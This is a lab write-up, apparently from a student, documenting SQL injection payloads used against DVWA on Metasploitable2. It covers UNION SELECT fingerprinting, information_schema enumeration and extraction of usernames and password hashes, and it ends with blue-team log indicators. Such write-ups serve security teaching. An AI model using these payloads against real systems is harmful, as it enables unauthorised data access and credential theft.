
# Commands Used — DVWA SQL Injection Lab

Este documento resume los principales payloads utilizados durante el laboratorio de **SQL Injection sobre DVWA / Metasploitable2**, incluyendo objetivo técnico y resultado esperado.

---

# 1. Vulnerability Validation

## Payload

```sql id="e0sx4a"
1' OR '1'='1
```

## Purpose

Validar si la aplicación es vulnerable a **SQL Injection**.

El payload intenta:

* cerrar la cadena original (`'`)
* introducir una condición lógica verdadera
* alterar el comportamiento de la query backend

---

## Technical Logic

Ejemplo simplificado.

Consulta original:

```sql id="6fpjlwm"
SELECT first_name,last_name
FROM users
WHERE id='1';
```

Consulta manipulada:

```sql id="6cvj0u"
SELECT first_name,last_name
FROM users
WHERE id='1' OR '1'='1';
```

---

## Expected Result

La condición siempre devuelve TRUE.

Resultado esperado:

* bypass de lógica SQL
* múltiples registros
* confirmación de inyección

---

# 2. Database Fingerprinting

## Payload

```sql id="lwhw8o"
1' UNION SELECT version(),database()#
```

---

## Purpose

Identificar:

* versión del DBMS
* base de datos actualmente utilizada

---

## Technical Logic

Uso de:

### version()

Devuelve versión del motor SQL.

### database()

Devuelve schema activo.

---

## Result Obtained

```txt id="e6e8l0"
MySQL 5.0.51a
dvwa
```

---

## Security Value

Permite:

* adaptar payloads específicos
* conocer compatibilidad del backend
* preparar etapas posteriores

---

# 3. Database Enumeration

## Payload

```sql id="gbo7bm"
1' UNION SELECT table_name,table_schema
FROM information_schema.tables#
```

---

## Purpose

Enumerar tablas existentes dentro del servidor MySQL.

---

## Technical Logic

Uso de:

### information_schema.tables

Metadata interna de MySQL.

Contiene:

* nombres de tablas
* schemas
* organización lógica de bases de datos

---

## Result Examples

```txt id="c2p9d8"
dvwa.users
dvwa.guestbook
mysql.user
owasp10.accounts
```

---

## Security Value

Permite mapear:

* arquitectura interna
* posibles objetivos sensibles
* superficies de extracción

---

# 4. Column Enumeration

## Payload

```sql id="m6h6f4"
1' UNION SELECT column_name,table_name
FROM information_schema.columns
WHERE table_name='users'#
```

---

## Purpose

Descubrir columnas disponibles dentro de una tabla objetivo.

---

## Technical Logic

Consulta sobre:

### information_schema.columns

Repositorio interno con:

* nombres de columnas
* tipos
* tablas asociadas

---

## Result Obtained

```txt id="oix9uv"
user_id
first_name
last_name
user
password
avatar
```

---

## Security Value

Permite construir extracción dirigida.

Ejemplo:

* usernames
* hashes
* PII
* datos internos

---

# 5. Credential Extraction

## Payload

```sql id="7tw5d4"
1' UNION SELECT user,password FROM users#
```

---

## Purpose

Intentar recuperación controlada de datos sensibles.

---

## Technical Logic

Se seleccionan columnas previamente descubiertas.

Objetivo:

extraer contenido directamente desde la tabla vulnerable.

---

## Result

Recuperación exitosa de:

* usernames
* password hashes

---

## Security Impact

Posibles escenarios reales:

* credential theft
* account takeover
* password cracking
* lateral movement

---

# 6. Why UNION SELECT Was Used

Durante el laboratorio se utilizó principalmente **UNION SELECT**.

Motivo:

UNION permite combinar resultados de:

* consulta legítima
* consulta inyectada

Ejemplo:

```sql id="18n0jv"
SELECT a,b
UNION
SELECT c,d
```

---

## Requirement

El número de columnas debe coincidir.

Por eso se utilizaron payloads de **dos columnas**.

Ejemplo:

```sql id="r4xbl5"
UNION SELECT version(),database()
```

---

# 7. Why information_schema Matters

Uno de los conceptos más importantes del laboratorio.

`information_schema` es una base interna del motor MySQL.

Funciona como un inventario del backend.

Permite consultar:

* databases
* tables
* columns
* privileges
* metadata

Sin ella, la enumeración manual sería mucho más compleja.

---

# 8. Blue Team Perspective

Indicadores observables en logs:

```txt id="4r6vb0"
UNION SELECT
OR '1'='1
information_schema
version()
```

Posibles fuentes de detección:

* Apache access.log
* Web server logs
* WAF alerts
* SIEM correlation rules

---

# Lab Environment

| Component   | Value           |
| ----------- | --------------- |
| Attacker    | Kali Linux      |
| Target      | Metasploitable2 |
| Application | DVWA            |
| Backend     | MySQL           |
| Attack Type | SQL Injection   |

---

# Disclaimer

Actividad realizada exclusivamente en entorno controlado con fines educativos.
